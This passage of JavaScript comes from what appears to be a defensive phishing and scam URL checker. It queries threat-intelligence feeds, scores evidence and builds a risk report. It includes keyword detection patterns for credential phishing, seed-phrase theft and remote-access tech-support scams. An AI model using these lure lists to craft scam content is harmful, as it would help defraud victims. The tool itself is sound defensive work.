  return{ok:true,source,handle:d.handle,name:d.ldhName,created:get('registration')||get('creation'),updated:get('last changed'),expires:get('expiration'),
    registrar:vcardGet(reg,'fn')||vcardGet(reg,'org')||reg?.handle||null,registrarUrl:rurl,
    registrant:rnt?(vcardGet(rnt,'org')||vcardGet(rnt,'fn')||null):null,
    dnssec:d.secureDNS?(d.secureDNS.delegationSigned?'Signed':'Unsigned'):null,
    status:d.status||[],nameservers:(d.nameservers||[]).map(n=>n.ldhName||n.name).filter(Boolean)};
}

/* ---------- threat intelligence (only sources actually consulted are reported) ---------- */
async function serverPost(path,body,ms=9000){
  const r=await fetchTO(apiUrl(path),{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(body)},ms);
  if(!r.ok)throw new Error('HTTP '+r.status);return r.json();
}
async function threatRecon(h,dns){
  const out={sources:[],matches:[],ts:new Date().toISOString()};
  const src=(id,name,st,detail)=>{out.sources.push({id,name,state:st,detail});};
  const jobs=[];
  // backend aggregator (VirusTotal, PhishTank, URLhaus, ...)
  if(backend.present&&cfg.backend){
    jobs.push(serverPost('/api/threat-intel',{url:h.url}).then(d=>{
      (d.sources||[]).forEach(s=>src('srv-'+s,s,'consulted','via server API'));
      (d.unavailable||[]).forEach(s=>src('srv-'+s,s,'unavailable','server could not reach provider'));
      (d.matches||[]).forEach(m=>out.matches.push({source:m.source,result:'MATCH',matchType:/related/i.test(m.type||'')?'RELATED INFRASTRUCTURE':/histor/i.test(m.type||'')?'HISTORICAL OBSERVATION':'DIRECT MATCH',first:m.firstSeen||null,last:m.lastSeen||null,confidence:m.confidence||'Medium',reference:m.evidenceUrl||null,ts:out.ts}));
    }).catch(()=>src('server','Server threat feeds','unavailable','backend did not respond')));
  }else{
    ['VirusTotal','PhishTank','URLhaus'].forEach(n=>src(n.toLowerCase(),n,'server-only','needs a server-side key / proxy'));
  }
  // Google Safe Browsing — only with the user's own demo key
  if(cfg.gsbKey){
    jobs.push(fj('https://safebrowsing.googleapis.com/v4/threatMatches:find?key='+encodeURIComponent(cfg.gsbKey),{timeout:7000,opts:{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({client:{clientId:'cyberguard-ai',clientVersion:'2.0'},threatInfo:{threatTypes:['MALWARE','SOCIAL_ENGINEERING','UNWANTED_SOFTWARE','POTENTIALLY_HARMFUL_APPLICATION'],platformTypes:['ANY_PLATFORM'],threatEntryTypes:['URL'],threatEntries:[{url:h.url}]}})}}).then(d=>{
      src('gsb','Google Safe Browsing','consulted',(d.matches||[]).length?'match returned':'no match returned');
      (d.matches||[]).forEach(m=>out.matches.push({source:'Google Safe Browsing',result:'MATCH — '+m.threatType,matchType:'DIRECT MATCH',first:null,last:null,confidence:'High',reference:'https://transparencyreport.google.com/safe-browsing/search?url='+encodeURIComponent(h.url),ts:out.ts}));
    }).catch(()=>src('gsb','Google Safe Browsing','unavailable','request failed (key, quota or network)')));
  }else if(!(backend.present&&cfg.backend)){src('gsb','Google Safe Browsing','needs-key','add a key in Settings (demo) or use the server API')}
  // urlscan.io public search — historical observations
  if(cfg.urlscan){
    jobs.push((async()=>{
      try{
        const q=u=>cached('us:'+u,()=>fj('https://urlscan.io/api/v1/search/?size=25&q='+encodeURIComponent(u),{timeout:8000}));
        const ipq=dns?.A?.[0]&&!isReservedIP(dns.A[0])?q('page.ip:"'+dns.A[0]+'"').catch(()=>null):Promise.resolve(null);
        const [dd,ii]=await Promise.all([q('page.domain:"'+h.host+'"'),ipq]);
        const rs=dd.results||[];
        src('urlscan','urlscan.io','consulted',rs.length?rs.length+' historical scan(s) found':'no historical scans found');
        if(rs.length){
          const times=rs.map(r=>r.task?.time||r.indexedAt).filter(Boolean).sort();
          const mal=rs.filter(r=>r.verdicts?.overall?.malicious===true);
          const ref='https://urlscan.io/search/#'+encodeURIComponent('page.domain:"'+h.host+'"');
          if(mal.length)out.matches.push({source:'urlscan.io',result:mal.length+' of '+rs.length+' scans flagged malicious',matchType:'DIRECT MATCH',first:times[0],last:times[times.length-1],confidence:'Medium',reference:'https://urlscan.io/result/'+mal[0]._id+'/',ts:out.ts});
          else out.matches.push({source:'urlscan.io',result:rs.length+' scan(s) of this host — no malicious verdict in search data',matchType:'HISTORICAL OBSERVATION',first:times[0],last:times[times.length-1],confidence:'Low',reference:ref,ts:out.ts});
          out.observed={first:times[0],last:times[times.length-1],count:rs.length};
        }
        const ir=ii?.results||[];
        const bad=ir.filter(r=>r.verdicts?.overall?.malicious===true&&r.page?.domain&&r.page.domain!==h.host);
        if(bad.length)out.matches.push({source:'urlscan.io (same IP)',result:bad.length+' other malicious-flagged site(s) seen on this IP',matchType:'RELATED INFRASTRUCTURE',first:null,last:null,confidence:'Low',reference:'https://urlscan.io/search/#'+encodeURIComponent('page.ip:"'+dns.A[0]+'"'),ts:out.ts});
        else if(ir.length>3)out.matches.push({source:'urlscan.io (same IP)',result:ir.length+' other scans share this IP — shared hosting is common and not evidence on its own',matchType:'INDIRECT EVIDENCE',first:null,last:null,confidence:'Low',reference:null,ts:out.ts});
      }catch(e){src('urlscan','urlscan.io','unavailable','public search unreachable (rate limit, CORS or network)')}
    })());
  }else src('urlscan','urlscan.io','disabled','switched off in Settings');
  await Promise.all(jobs);
  return out;
}

/* ---------- optional server calls ---------- */
async function serverScan(h){try{return await serverPost('/api/scan',{url:h.url},12000)}catch{return null}}
async function pageRemote(h){try{return await serverPost('/api/page-analysis',{url:h.url},15000)}catch{return null}}

/* =====================================================================
   STATE, SCAM-PATTERN ANALYZER, EVIDENCE CORRELATION, ANALYST ENGINE
   ===================================================================== */
const freshState=()=>({target:null,h:null,server:null,dns:null,infra:null,rdap:null,ti:null,page:null,evidence:[],timeline:[],patterns:[],known:[],unknown:[],consulted:[],score:null,conf:null,ageDays:null,scanTime:null,done:false});
let state=freshState();

const SCAM=[
 {name:'Credential phishing',kw:/log\s?in|sign\s?in|password|credential|verify (your )?(account|identity)|webscr|session expired/i},
 {name:'Banking fraud',kw:/net\s?banking|\bbank\b|ifsc|debit card|credit card|account (is )?(blocked|suspended)|\bsbi\b|hdfc|icici|axis ?bank|kotak|\bpnb\b/i},
 {name:'UPI / payment fraud',kw:/\bupi\b|collect request|phonepe|gpay|paytm|bhim|qr code|scan (to|and) (pay|receive)|payment (failed|pending)/i},
 {name:'Fake parcel / delivery',kw:/parcel|courier|delivery|tracking|india post|fedex|dhl|customs (fee|duty)|shipment|address (incomplete|issue)/i},
 {name:'Social media account theft',kw:/instagram|facebook|whatsapp|telegram|account (recovery|verification)|blue tick|copyright (violation|strike)|appeal/i},
 {name:'Corporate login phishing',kw:/office\s?365|outlook|sharepoint|onedrive|docusign|shared (a )?document|webmail|mailbox (full|quota)|helpdesk|\bsso\b/i},
 {name:'Government impersonation',kw:/income tax|\bitr\b|aadhaar|uidai|\bpan\b|e-?challan|epfo|\bgst\b|\brbi\b|\btrai\b|\bcbi\b|police|court|\.gov/i},
 {name:'Tech-support scam',kw:/virus detected|(pc|computer|device) is infected|call (microsoft|apple|support)|remote (access|support)|anydesk|teamviewer|quicksupport|toll[- ]free/i},
 {name:'Investment scam',kw:/invest(ment)?|guaranteed (returns?|profit)|stock tips|trading|\bipo\b|mutual fund|vip group|double your/i},
 {name:'Cryptocurrency scam',kw:/crypto|bitcoin|\bbtc\b|ethereum|usdt|wallet|airdrop|binance|coinbase|seed phrase|\bnft\b/i},
 {name:'Fake shopping website',kw:/\b\d{2}% off|clearance|flash sale|cash on delivery|limited stock|free shipping|discount (code|sale)|buy now/i},
 {name:'Lottery / prize scam',kw:/lottery|prize|winner|you('| ha)ve won|lucky draw|claim (your )?(reward|prize|gift)|congratulations/i},
 {name:'Malware delivery',kw:/\.apk|\.exe|install (the )?(app|update)|download (now|the)|update (flash|chrome|browser)|enable macros/i},
 {name:'Account verification scam',kw:/verify|re-?kyc|update (your )?(kyc|details|account)|confirm (your )?(identity|account)|suspended|deactivat/i},
 {name:'Recruitment / job scam',kw:/job offer|work from home|part[- ]time|earn\s?(₹|rs\.?|\$)?\s?\d|per day|hiring|registration fee|data entry|like (and )?subscribe/i},
 {name:'Loan scam',kw:/instant loan|pre-?approved|loan (approved|offer)|no cibil|processing fee|low interest|\bemi\b/i},
 {name:'Identity theft',kw:/aadhaar|\bpan\b|passport|selfie|upload (your )?(id|document)|kyc document|date of birth|maiden name/i}
];
function detectScam(text){
  return SCAM.map(p=>{const m=String(text).match(new RegExp(p.kw.source,'gi'));const u=m?[...new Set(m.map(x=>x.toLowerCase()))]:[];return{name:p.name,hits:u.length,sample:u.slice(0,4)}}).filter(x=>x.hits).sort((a,b)=>b.hits-a.hits);
}
const strength=n=>n>=3?'strong indicators':n===2?'moderate indicators':'weak indicator';

const verdictOf=(score,conf)=>({label:score>=60?'HIGH RISK':score>=30?'REVIEW REQUIRED':'LOWER OBSERVED RISK',cls:score>=60?'hi':score>=30?'rev':'',low:conf<50});
const riskColor=s=>s>=60?'#ff3b57':s>=30?'#ffc233':'#00ff66';

function correlate(){
  const s=state,h=s.h,ev=[],now=new Date().toISOString();
  const push=(source,finding,type,severity,o={})=>ev.push({source,finding,type,severity,first:o.first||null,last:o.last||null,confidence:o.conf||'Medium',relationship:o.rel||'DIRECT OBSERVATION',reference:o.ref||null,ts:now});
  let score=h.score,extra=0;
  h.flags.forEach(f=>push('URL heuristics',f.title+' — '+f.desc,'URL signal',f.sev==='flag'?'High':'Medium'));
  const d=s.dns;
  if(d?.ok&&!d.skipped){
    if(d.nx)push('DNS ('+d.provider+')','Domain does not resolve (NXDOMAIN) — nothing is currently hosted at this name','DNS','Medium',{conf:'High'});
    else{
      if(d.A.length||d.AAAA.length)push('DNS ('+d.provider+')','Resolves to '+[...d.A,...d.AAAA].join(', '),'DNS','Info',{conf:'High'});
      else push('DNS ('+d.provider+')','No A/AAAA records returned','DNS','Low',{conf:'Medium'});
      if(!d.MX.length&&d.mailSeen?.mx)push('DNS','No MX records — domain is not set up to receive email (weak context)','DNS','Info',{conf:'Low'});
      if(d.mailSeen?.txt&&!d.SPF&&!d.DMARC)push('DNS','No SPF or DMARC policy published (weak context; common on small sites)','DNS','Info',{conf:'Low'});
    }
  }
  const i=s.infra;
  if(i?.ok)push('IP intelligence ('+(i.source||'lookup')+')',[i.ip,i.org||i.isp,i.asn,[i.city,i.region,i.country].filter(Boolean).join(', ')].filter(Boolean).join(' · ')+' — infrastructure is context, not proof of intent','Infrastructure','Info',{conf:'High'});
  const r=s.rdap;s.ageDays=null;
  if(r?.ok&&r.created){
    const days=Math.max(0,Math.floor((Date.now()-new Date(r.created))/864e5));s.ageDays=days;
    let pts=0,sev='Info';if(days<7){pts=18;sev='High'}else if(days<30){pts=14;sev='High'}else if(days<90){pts=8;sev='Medium'}else if(days<365){pts=3;sev='Low'}
    if(pts){score+=pts;extra++}
    push('RDAP ('+r.source+')',`Domain created ${fmtDay(r.created)} (${days} days ago). Creation date is not the site’s publishing date.`,'Registration',sev,{first:r.created,conf:'High'});
  }
  const p=s.page;
  if(p){
    const src='Page behaviour ('+p.source+')';
    if(p.passwordFields)push(src,`${p.passwordFields} password field(s) in ${p.forms} form(s)`,'Behaviour',h.trusted?'Info':'Medium',{conf:'High'});
    if(p.externalActions?.length){score+=18;extra++;push(src,'Form submits to a different site: '+p.externalActions.slice(0,3).join(', '),'Behaviour','High',{conf:'High'})}
    if(p.insecureActions?.length){score+=8;extra++;push(src,'Form posts over unencrypted HTTP','Behaviour','High',{conf:'High'})}
    if(p.brandMismatch){score+=14;extra++;push(src,'Page text references “'+p.brandMismatch+'” but the domain does not belong to that brand','Behaviour','High',{conf:'Medium'})}
    if(p.obfuscation?.length>=2){score+=8;extra++;push(src,'Script obfuscation patterns: '+p.obfuscation.join(', '),'Behaviour','Medium',{conf:'Medium'})}else if(p.obfuscation?.length===1){score+=3;push(src,'Script pattern worth reviewing: '+p.obfuscation[0],'Behaviour','Low',{conf:'Low'})}
    if(p.hiddenIframes){score+=6;extra++;push(src,p.hiddenIframes+' hidden/zero-size iframe(s)','Behaviour','Medium',{conf:'Medium'})}
    if(p.metaRefresh){score+=4;push(src,'Page uses a meta-refresh redirect','Behaviour','Low',{conf:'Medium'})}
    if(p.downloads?.length){score+=10;extra++;push(src,'Links to downloadable files: '+p.downloads.slice(0,3).join(', '),'Behaviour','High',{conf:'Medium'})}
    if(!ev.some(e=>e.source===src))push(src,'No high-risk structure observed in the inspected HTML','Behaviour','Info',{conf:'Medium'});
  }
  let direct=false;
  (s.ti?.matches||[]).forEach(m=>{
    const sev=m.matchType==='DIRECT MATCH'?'High':m.matchType==='RELATED INFRASTRUCTURE'?'Medium':'Low';
    push(m.source,m.result,'Threat intelligence',sev,{first:m.first,last:m.last,conf:m.confidence,rel:m.matchType,ref:m.reference});
    if(m.matchType==='DIRECT MATCH'){const authoritative=!/urlscan/i.test(m.source);score+=authoritative?40:22;extra++;if(authoritative)direct=true}
    else if(m.matchType==='RELATED INFRASTRUCTURE'){score+=8;extra++}
  });
  const consultedTI=(s.ti?.sources||[]).filter(x=>x.state==='consulted').length;
  if(extra+h.flags.length<=1&&!direct)score=Math.min(score,29);
  if(direct)score=Math.max(score,70);
  if(h.trusted&&!(s.ti?.matches||[]).some(m=>m.matchType==='DIRECT MATCH'))score=Math.min(score,12);
  s.score=Math.max(0,Math.min(100,Math.round(score)));
  let c=30;if(d?.ok&&!d.skipped)c+=12;if(i?.ok)c+=10;if(r?.ok)c+=14;c+=Math.min(16,consultedTI*8);if(p)c+=12;if(h.flags.length>=2)c+=4;if(direct)c+=12;
  s.conf=Math.min(94,c);
  s.evidence=ev;
  // scam patterns
  s.patterns=detectScam([h.url,h.host,p?.title||'',(p?.text||'').slice(0,5000)].join(' '));
  // timeline
  const tl=[];
  if(r?.ok){if(r.created)tl.push({t:'DOMAIN CREATED',d:r.created,src:'RDAP · '+r.source});if(r.updated)tl.push({t:'DOMAIN UPDATED',d:r.updated,src:'RDAP · '+r.source});if(r.expires)tl.push({t:'DOMAIN EXPIRES',d:r.expires,src:'RDAP · '+r.source})}
  const ob=s.ti?.observed;
  if(ob){tl.push({t:'FIRST OBSERVED',d:ob.first,src:'urlscan.io ('+ob.count+' scans)'});tl.push({t:'LAST OBSERVED',d:ob.last,src:'urlscan.io'})}
  const rep=(s.ti?.matches||[]).filter(m=>m.matchType==='DIRECT MATCH'&&m.first).map(m=>m.first).sort()[0];
  if(rep)tl.push({t:'FIRST REPORTED',d:rep,src:'threat-intelligence source'});
  tl.sort((a,b)=>new Date(a.d)-new Date(b.d));
  tl.push({t:'CURRENT SCAN',d:s.scanTime.toISOString(),src:'this investigation'});
  if(!ob)tl.push({t:'FIRST OBSERVED / LAST OBSERVED',d:null,src:'no source returned historical observations'});
  if(!rep)tl.push({t:'FIRST REPORTED',d:null,src:'no consulted source returned a first-report date'});
  if(!r?.ok||!r.created)tl.push({t:'DOMAIN CREATED',d:null,src:'registration data unavailable'});
  s.timeline=tl;
  // sources consulted
  const cs=['URL heuristics (local, in-browser)'];
  if(d?.ok&&!d.skipped)cs.push('DNS — '+d.provider);if(i?.ok)cs.push('IP intelligence — '+i.source);if(r?.ok)cs.push('RDAP — '+r.source);
  (s.ti?.sources||[]).filter(x=>x.state==='consulted').forEach(x=>cs.push('Threat intelligence — '+x.name));
  if(p)cs.push('Page behaviour — '+p.source);
  s.consulted=cs;
  // known / unknown
  const kn=[],un=[];
  kn.push(`URL structure analysed: ${h.flags.length} signal(s) flagged, ${h.passes.length} passed.`);
  if(d?.ok&&!d.skipped)kn.push(d.nx?'The domain does not currently resolve in DNS.':'DNS records were retrieved ('+[...d.A,...d.AAAA].length+' address record(s), '+d.MX.length+' MX, '+d.NS.length+' NS).');else un.push('DNS records: '+(d?.skipped||d?.error||(d?.disabled?'lookup switched off in Settings':'not retrieved'))+'.');
  if(i?.ok)kn.push(`Hosting observation: ${i.ip}${i.org?' · '+i.org:''}${i.asn?' · '+i.asn:''}.`);else un.push('IP / ASN / hosting: '+(i?.skipped||i?.error||(i?.disabled?'lookup switched off in Settings':'not retrieved'))+'.');
  if(r?.ok)kn.push(r.created?`Domain registration created ${fmtDay(r.created)}.`:'Registration record exists but returned no creation event.');else un.push('Domain registration data: '+(r?.skipped||r?.error||(r?.disabled?'lookup switched off in Settings':'not retrieved'))+'.');
  const notc=(s.ti?.sources||[]).filter(x=>x.state!=='consulted');
  if(consultedTI)kn.push('Threat-intelligence sources consulted: '+(s.ti.sources.filter(x=>x.state==='consulted').map(x=>x.name).join(', '))+'.');
  if(notc.length)un.push('Not consulted: '+notc.map(x=>x.name).join(', ')+' ('+[...new Set(notc.map(x=>x.state==='server-only'?'needs server-side key':x.state==='needs-key'?'needs API key':x.state==='disabled'?'switched off':'unreachable'))].join('; ')+').');
  if(!(s.ti?.matches||[]).length&&consultedTI)kn.push('No consulted source returned a match. This is not proof the site is safe.');
  if(p)kn.push('Page structure was inspected ('+p.source+').');else un.push('Live page content was not inspected — use the Page Behaviour tab or the server API.');
  un.push('Who operates the site: registrant details are usually redacted and are not identity evidence.');
  s.known=kn;s.unknown=un;
}

function analyst(){
  const s=state,h=s.h;if(!h||s.score==null)return null;
  const v=verdictOf(s.score,s.conf),i=s.infra,r=s.rdap,p=s.page;
  const why=h.flags.map(f=>f.title+' — '+f.desc);
  s.evidence.filter(e=>e.type!=='URL signal'&&(e.severity==='High'||e.severity==='Medium')).forEach(e=>why.push(e.finding));
  const matches=s.ti?.matches||[];
  const consulted=(s.ti?.sources||[]).filter(x=>x.state==='consulted').map(x=>x.name);
  const ti=matches.length?matches.map(m=>`${m.matchType}: ${m.source} — ${m.result}`):[consulted.length?`No match returned by: ${consulted.join(', ')}. Absence of a match does not prove safety.`:'No threat-intelligence source was consulted in this scan.'];
  const infra=i?.ok?[`IP ${i.ip}`,i.org||i.isp?`Organisation / ISP: ${i.org||i.isp}`:null,i.asn?`ASN: ${i.asn}`:null,[i.city,i.region,i.country].filter(Boolean).length?`Server location: ${[i.city,i.region,i.country].filter(Boolean).join(', ')} (describes infrastructure, not the operator)`:null,i.rdns?`Reverse DNS: ${i.rdns}`:null].filter(Boolean):['Infrastructure data unavailable.'];
  const behaviour=p?[`Forms: ${p.forms} · Password fields: ${p.passwordFields} · Hidden inputs: ${p.hiddenInputs} · Iframes: ${p.iframes} · Scripts: ${p.scripts}`,p.externalActions?.length?'External form destination(s): '+p.externalActions.join(', '):'No external form destination observed.',p.obfuscation?.length?'Script patterns: '+p.obfuscation.join(', '):'No obfuscation patterns observed.']:['Page behaviour was not analysed.'];
  const strong=s.patterns.filter(x=>x.hits>=2);
  const patterns=s.patterns.length?s.patterns.slice(0,5).map(x=>`POSSIBLE SCAM PATTERN — ${x.name} (${strength(x.hits)}: ${x.sample.join(', ')})`):['No specific scam pattern established from the available evidence.'];
  const exec=`${h.host} is assessed as ${v.label} (risk ${s.score}/100, confidence ${s.conf}%). ${h.flags.length} URL-level signal(s) were flagged and ${s.consulted.length} evidence source(s) contributed.${v.low?' Insufficient evidence for a confident determination.':''} This assessment is evidence-based and is not proof that the website is fraudulent.`;
  const actions=s.score>=60?['Do not enter passwords, OTPs, PINs, card details or personal documents on this site.','Do not install files or apps from it.','If it reached you by SMS, WhatsApp or email, keep the message as evidence, then delete it.','Reach the real organisation by typing its official address or using its official app.']:s.score>=30?['Verify the organisation independently before sharing anything sensitive.','Check the address character by character against the official site.','Treat urgent requests for OTP, PIN or payment as a red flag.']:['No strong warning cluster was observed — this is not a guarantee of legitimacy.','Still avoid entering credentials if you arrived via an unexpected message.'];
  const victim=['Already entered information? Open the Incident Response Center for a personalised plan.','Money involved? Call 1930 immediately, then contact your bank through an official channel.'];
  const reporting=['National Cyber Crime Helpline: 1930','National Cyber Crime Reporting Portal: https://www.cybercrime.gov.in/','Mumbai / Maharashtra cyber police contacts: see the Cybercrime Help tab (verify before use).','Report the phishing page to the browser vendor’s phishing-report form and to the impersonated brand’s abuse team.'];
  return{verdict:v.label,cls:v.cls,score:s.score,conf:s.conf,exec,why,ti,infra,behaviour,patterns,strong,known:s.known,unknown:s.unknown,actions,victim,reporting,sources:s.consulted};
}

/* =====================================================================
   CONSOLE (SOC-style telemetry) + INVESTIGATION RUNNER
   ===================================================================== */
const STAGES=[['INITIALIZING INVESTIGATION','session'],['PARSING TARGET','URL parser · PSL subset'],['RESOLVING DNS','DNS-over-HTTPS'],['IDENTIFYING INFRASTRUCTURE','IP · ASN · reverse DNS'],['ANALYZING DOMAIN HISTORY','RDAP'],['CHECKING THREAT INTELLIGENCE','urlscan · Safe Browsing · server feeds'],['ANALYZING WEBSITE BEHAVIOUR','server page scan'],['CORRELATING EVIDENCE','evidence engine'],['RUNNING AI ANALYSIS','analyst engine'],['GENERATING REPORT','report builder']];
const con={t0:0,timer:null,warn:0,err:0,retry:0,found:0,srcN:0,done:0,st:{},
  reset(){clearInterval(this.timer);this.warn=this.err=this.retry=this.found=this.srcN=this.done=0;this.st={};this.t0=performance.now();
    $('#log').innerHTML='';$('#progBar').style.width='0%';
    $('#stages').innerHTML=STAGES.map((x,i)=>`<div class="stg" id="stg${i}"><i class="ico"></i><span class="nm">${x[0]}</span><span class="src">${esc(x[1])}</span><span class="tm">—</span><span class="st">QUEUED</span></div>`).join('');
    $('#stageState').textContent='RUNNING';$('#radar').classList.add('on');
    this.timer=setInterval(()=>{$('#t-el').textContent=((performance.now()-this.t0)/1000).toFixed(1)+'s'},100);this.sync()},
  sync(){$('#t-st').textContent=this.done+'/'+STAGES.length;$('#t-ev').textContent=this.found;$('#t-wa').textContent=this.warn;$('#t-er').textContent=this.err;$('#t-re').textContent=this.retry;$('#t-so').textContent=this.srcN;$('#progBar').style.width=Math.round(this.done/STAGES.length*100)+'%'},
  log(msg,cls=''){const el=$('#log');if(!el)return;const d=document.createElement('div');d.innerHTML=`<span class="t">${new Date().toLocaleTimeString([],{hour12:false})}</span> <span class="${cls}">${esc(msg)}</span>`;el.appendChild(d);el.scrollTop=el.scrollHeight;if(cls==='w')this.warn++;if(cls==='e')this.err++;this.sync()},
  stage(i,status,note){
    const row=$('#stg'+i);if(!row)return;
    if(status==='run'){this.st[i]=performance.now();row.className='stg run';row.querySelector('.st').textContent='RUNNING';$('#curOp').textContent=STAGES[i][0]+'…';$('#curSrc').textContent='data source: '+STAGES[i][1];this.log('▶ '+STAGES[i][0].toLowerCase(),'f')}
    else{const ms=this.st[i]?performance.now()-this.st[i]:0;row.className='stg '+status;row.querySelector('.st').textContent={done:'DONE',warn:'PARTIAL',fail:'FAILED',skip:'SKIPPED'}[status];row.querySelector('.tm').textContent=ms?(ms/1000).toFixed(1)+'s':'—';if(note)row.querySelector('.src').textContent=note;this.done++;this.log((status==='done'?'✓ ':status==='warn'?'! ':status==='fail'?'✗ ':'– ')+STAGES[i][0].toLowerCase()+(note?' — '+note:''),status==='fail'?'e':status==='warn'?'w':'');}
    this.sync();
  },
  finish(label){clearInterval(this.timer);$('#t-el').textContent=((performance.now()-this.t0)/1000).toFixed(1)+'s';$('#stageState').textContent=label;$('#radar').classList.remove('on');$('#curOp').textContent=label==='COMPLETE'?'Investigation complete':'Investigation stopped';this.sync()}
};

let running=false;
async function investigate(raw){
  if(running)return;
  const h=heuristic(raw);
  if(!h){toast('Enter a valid http(s) URL or domain (no spaces).');return}
  running=true;$('#scanBtn').disabled=true;
  state=freshState();state.target=h.url;state.h=h;state.scanTime=new Date();state.score=h.score;
  navigate('investigate');con.reset();$('#tgt').value=h.url;$('#signalTable').innerHTML='<div class="empty">Investigation running…</div>';
  try{
    con.stage(0,'run');await sleep(160);con.log('target accepted: '+h.host+(h.reg!==h.host?'  (registrable: '+h.reg+')':''));con.stage(0,'done');
    con.stage(1,'run');await sleep(160);con.found+=h.flags.length;con.srcN++;con.log(h.flags.length+' signal(s) flagged · '+h.passes.length+' passed',h.flags.length?'w':'');con.stage(1,'done',h.flags.length+' flagged / '+h.passes.length+' passed');
    con.log('dispatching parallel lookups: DNS · RDAP · IP · threat intel · page');
    const pSrv=(backend.present&&cfg.backend)?serverScan(h):Promise.resolve(null);
    const pDNS=pSrv.then(sv=>dnsRecon(h,sv));
    const pInfra=pDNS.then(async d=>infraRecon(h,d,await pSrv));
    const pRDAP=pSrv.then(sv=>rdapRecon(h,sv));
    const pTI=pDNS.then(d=>threatRecon(h,d));
    const pPage=pSrv.then(()=>(backend.present&&cfg.backend)?pageRemote(h):null);
    const bad=x=>!x||!x.ok;

    con.stage(2,'run');state.dns=await pDNS;
    if(state.dns.ok&&!state.dns.skipped){con.srcN++;con.found+=state.dns.A.length+state.dns.AAAA.length+state.dns.MX.length+state.dns.NS.length;con.stage(2,state.dns.nx?'warn':'done',state.dns.nx?'NXDOMAIN — domain does not resolve':state.dns.provider)}
    else con.stage(2,state.dns.skipped?'skip':'fail',state.dns.skipped||state.dns.error||'lookup disabled');
    con.stage(3,'run');state.infra=await pInfra;
    if(state.infra.ok){con.srcN++;con.found++;con.stage(3,'done',(state.infra.org||state.infra.isp||state.infra.ip)+' · '+(state.infra.source||''))}
    else con.stage(3,state.infra.skipped||state.infra.disabled?'skip':'warn',state.infra.skipped||state.infra.error||'lookup disabled');
    con.stage(4,'run');state.rdap=await pRDAP;
    if(state.rdap.ok){con.srcN++;con.found++;con.stage(4,'done',state.rdap.created?'created '+fmtDay(state.rdap.created):'no creation event')}
    else con.stage(4,state.rdap.skipped||state.rdap.disabled?'skip':'warn',state.rdap.skipped||state.rdap.error||'lookup disabled');
    con.stage(5,'run');state.ti=await pTI;
    const used=state.ti.sources.filter(x=>x.state==='consulted');con.srcN+=used.length;con.found+=state.ti.matches.length;
    con.stage(5,used.length?(state.ti.matches.some(m=>m.matchType==='DIRECT MATCH')?'warn':'done'):'warn',used.length?used.map(x=>x.name).join(', ')+' consulted':'no source could be consulted');
    con.stage(6,'run');const pg=await pPage;
    if(pg&&pg.page){state.page=normRemotePage(pg);con.srcN++;con.stage(6,'done','server page scan');renderBehaviour()}
    else con.stage(6,'skip',backend.present?'server returned no page data':'needs backend — use Page Behaviour tab');
    con.stage(7,'run');await sleep(150);correlate();con.found+=0;con.stage(7,'done',state.evidence.length+' evidence records');
    con.stage(8,'run');await sleep(200);state.done=true;con.stage(8,'done','risk '+state.score+' · confidence '+state.conf+'%');
    con.stage(9,'run');await sleep(140);renderAll();con.stage(9,'done');
    con.finish('COMPLETE');
    pushHistory({url:h.url,host:h.host,score:state.score,conf:state.conf,verdict:verdictOf(state.score,state.conf).label,ts:Date.now()});
    toast(state.conf<50?'Investigation complete — insufficient evidence for a confident determination.':'Investigation complete. Evidence kept separate from unknowns.');
  }catch(e){
    con.log('investigation error: '+(e.message||e),'e');con.finish('FAILED');toast('Investigation stopped safely. See the console log.');
  }finally{running=false;$('#scanBtn').disabled=false}
}
function normRemotePage(d){
  const p=d.page||{};
  return{source:'server /api/page-analysis',status:d.response?.status,finalUrl:d.finalUrl,redirects:(d.redirects||[]).length,title:p.title||'',forms:p.forms||0,passwordFields:p.passwordFields||0,hiddenInputs:p.hiddenFields||0,iframes:p.iframes||0,hiddenIframes:0,scripts:p.scripts||0,externalHosts:[],externalHostCount:p.externalHostCount||0,externalActions:p.externalActions||[],insecureActions:[],obfuscation:p.suspiciousScriptHints||[],downloads:[],metaRefresh:false,brandMismatch:null,text:p.text||''};
}
ACT.scan=()=>investigate($('#tgt').value);
ACT.quickscan=()=>{const v=$('#ovInput').value.trim();if(!v){toast('Paste a URL or domain first.');return}investigate(v)};
$('#tgt').addEventListener('keydown',e=>{if(e.key==='Enter')ACT.scan()});
$('#ovInput').addEventListener('keydown',e=>{if(e.key==='Enter')ACT.quickscan()});

/* =====================================================================
   RENDERERS
   ===================================================================== */
function renderAll(){
  const s=state,h=s.h,v=verdictOf(s.score,s.conf);
  $('#riskNum').textContent=s.score;
  const arc=$('#riskArc');arc.style.stroke=riskColor(s.score);arc.style.strokeDashoffset=389.6-(389.6*s.score/100);
  $('#verdict').textContent=v.label;$('#verdict').className='verdict '+v.cls;
  $('#banner').textContent=v.label+(v.low?' · LOW CONFIDENCE':'');$('#banner').className='banner '+v.cls;
  $('#confVal').textContent=s.conf+'%';$('#confBar').style.width=s.conf+'%';$('#sigVal').textContent=h.flags.length+' flagged / '+h.passes.length+' passed';
  $('#confNote').textContent=v.low?'Insufficient evidence for a confident determination. Risk reflects only what could be observed.':'Risk = how concerning the evidence is. Confidence = how much evidence supports that reading.';
  $('#analystNote').textContent=s.score>=60?'Several independent indicators warrant strong caution. Do not submit credentials or payment details based on this scan alone, and never trust this page because it uses HTTPS.':s.score>=30?'Some suspicious indicators are present. Verify the organisation independently before sharing anything sensitive.':'No strong warning cluster was observed. That is not a guarantee of legitimacy — absence of evidence is not evidence of absence.';
  $('#themeColor').setAttribute('content',riskColor(s.score)==='#00ff66'?'#000402':riskColor(s.score));
  // overview cards
  $('#ov-target').textContent=h.host;$('#ov-time').textContent=fmtDate(s.scanTime);$('#ov-risk').textContent=s.score+' / '+s.conf+'%';$('#ov-bar').style.width=s.score+'%';
  // signals table
  const rows=h.flags.map(f=>`<tr><td><b>${esc(f.title)}</b></td><td>${tag(f.sev==='flag'?'ALERT':'WARNING',f.sev==='flag'?'r':'a')}</td><td>+${f.pts}</td><td>${esc(f.desc)}</td></tr>`).concat(h.passes.map(x=>`<tr><td>${esc(x)}</td><td>${tag('PASS')}</td><td>—</td><td>Passed contextual check</td></tr>`));
  $('#signalTable').innerHTML='<div class="tw"><table class="tbl"><thead><tr><th>SIGNAL</th><th>TYPE</th><th>WEIGHT</th><th>OBSERVATION</th></tr></thead><tbody>'+rows.join('')+'</tbody></table></div><div class="note mt">Country and TLD are weak context only. No single signal decides the verdict — a lone signal can never exceed the lower-risk band.</div>';
